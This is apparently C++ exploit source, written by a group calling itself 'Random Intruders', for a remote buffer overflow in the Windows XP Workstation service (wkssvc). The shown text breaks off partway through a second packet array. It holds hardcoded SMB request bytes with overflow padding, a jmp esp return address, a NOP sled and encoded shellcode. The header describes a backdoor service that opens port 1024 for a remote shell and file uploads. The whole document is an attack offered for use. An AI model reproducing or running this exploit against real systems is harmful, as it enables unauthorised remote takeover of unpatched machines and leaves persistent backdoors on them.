/*
Written by
sectroyer and evil
members of Random Intruders with sol support.

We have finished this exploit months ago (last modification in febraury),
but we've didn't publish it because potential impact was too huge.
After Sasser wave attacks we've decided to do it.
Here it is first Microsoft Workstation Buffer Overflow Universal Exploit!!!
This code works only againts WinXP. It simulates NetAddAlternateComputerName API
so it will exploit FAT system as well as NTFS ones. This is only Proof of Concept
code and this is why it is like it is;))) As a return address it uses jmp esp in wkssvc.dll
(0x7513A747) so it works against any Polish XP for English you may and probably will have to
change it. I hold the view (because of my tests) that this address is universal,
but if it is not let me know;)))
The exploit not always works, and sometimes you will have to execute it few times with the same
arguments (I think this is due to huge size of the packets). Nevertheless if the attack is succesful
you will always have remote access to the hacked server, since exploit installs sevice shsrv.exe
(pure asm backdoor) which opens port 1024. if you netcat (telnet negotiation will be rejected)
to that port you have type 'cmd' hit enter and you will get shell(note this backdoor won't
work on Win2k, so if you want to write similar exploit for the NetValidateName API you
will have to change it). There is also possibe to upload files to the server trough
this backdoor (program myftp attached at the end of this message enables it;)).

That's all any questions,
suggestions and corrections <sectroyer@go2.pl>
/--------------------wks.cpp------------------------------------------------------------------
*/unsigned char First_WKSSVC_Request[]=
"\x00\x00\x10\xf8\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xff\xfe\x00\x08\x70\x00\x0e\xff\x00\xde\xde\x00"
"\x40\x00\x00\x00\x00\xff\xff\xff\xff\x08\x00\xb8\x10\x00\x00\xb8"
"\x10\x40\x00\x00\x00\x00\x00\xb9\x10\xee\x05\x00\x00\x01\x10\x00"
"\x00\x00\xb8\x10\x00\x00\x01\x00\x00\x00\xd8\x1f\x00\x00\x00\x00"
"\x1b\x00\x7c\xda\x12\x00\x12\x00\x00\x00\x00\x00\x00\x00\x12\x00"
"\x00\x00\x5c\x00\x5c\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00"
"\x30\x00\x30\x00\x2e\x00\x30\x00\x30\x00\x30\x00\x2e\x00\x30\x00"
"\x30\x00\x31\x00\x00\x00\x54\x3a\x12\x00\xc3\x0f\x00\x00\x00\x00"
"\x00\x00\xc3\x0f\x00\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"

//------------------------------------------------------------------------------------
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"

//------------------------------------------------------------------------------------
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"

"\x90\x00\x90\x00\x90\x00\x47\x00\xA7\x00\x13\x00\x75\x00\x90\x00"  //  <-- 0x7513A747 jmp esp in wkssvc.dll (Any Polish

XP;))
//"\x90\x00\x90\x00\x90\x00\x00\x00\x44\x00\x00\x00\x44\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00"
"\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\x90\x00\xeb\x00"
"\x11\x00\x58\x00\x31\x00\xc9\x00\xac\x20\x30\x00\x44\x00\x40\x00"
"\x41\x00\x66\x00\x81\x00\x6f\x01\x61\x01\x01\x00\x75\x00\xf4\x00"
"\xeb\x00\x05\x00\x0d\x01\x19\x01\xd9\x02\xd9\x02\xd9\x02\xc7\x00"
"\xa8\x00\x20\x00\xcd\x00\xd8\x02\xac";
//------------------------------------------------------------------------------------
unsigned char Second_WKSSVC_Request[]=
"\x00\x00\x0f\xa4\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x40\x02\x00\x08\x81\x00\x10\x00\x00\x50\x0f\x00"
"\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54"
"\x00\x50\x0f\x54\x00\x02\x00\x26\x00\x00\x40\x61\x0f\x00\x5c\x00"
"\x50\x00\x49\x00\x50\x00\x45\x00\x5c\x00\x00\x00\x00\x00\x05\x00"
